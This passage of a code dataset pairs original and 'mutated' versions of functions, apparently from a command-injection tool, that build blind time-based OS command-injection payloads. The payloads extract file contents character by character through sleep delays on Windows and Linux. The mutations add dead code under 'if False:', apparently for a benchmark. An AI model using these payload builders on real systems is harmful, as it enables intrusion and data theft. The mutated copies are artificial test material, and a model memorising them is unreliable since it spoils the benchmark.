'|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.read().strip()[\" + str(num_of_chars - 1) + '][0])); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\")' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(ord(file.readlines()[0][\" + str(num_of_chars - 1) + ']))\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    },
    {
        "func_name": "fp_result",
        "original": "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
        "mutated": [
            "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload",
            "def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\' cmd /c \"powershell.exe -InputFormat none (Get-Content ' + OUTPUT_TEXTFILE + ')\"\\') do if %i==' + str(ord(str(ascii_char))) + settings.SINGLE_WHITESPACE + 'cmd /c \"powershell.exe -InputFormat none Start-Sleep -s ' + str(2 * timesec + 1) + '\"'\n    elif separator == ';' or separator == '%0a':\n        payload = separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + 'if [ ' + str(ord(str(ascii_char))) + ' -ne ${str} ]' + separator + 'then sleep 0' + separator + 'else sleep ' + str(timesec) + separator + 'fi '\n    elif separator == '&&':\n        separator = _urllib.parse.quote(separator)\n        ampersand = _urllib.parse.quote('&')\n        payload = ampersand + 'sleep 0' + separator + 'str=$(cut -c1-2 ' + OUTPUT_TEXTFILE + ')' + separator + '[ ' + str(ord(str(ascii_char))) + ' -eq ${str} ] ' + separator + 'sleep ' + str(timesec)\n        separator = _urllib.parse.unquote(separator)\n    elif separator == '||':\n        pipe = '|'\n        payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(cat ' + OUTPUT_TEXTFILE + ') ] ' + separator + 'sleep ' + str(timesec)\n    else:\n        pass\n    return payload"
        ]
    },
    {
        "func_name": "fp_result_alter_shell",
        "original": "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
        "mutated": [
            "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + 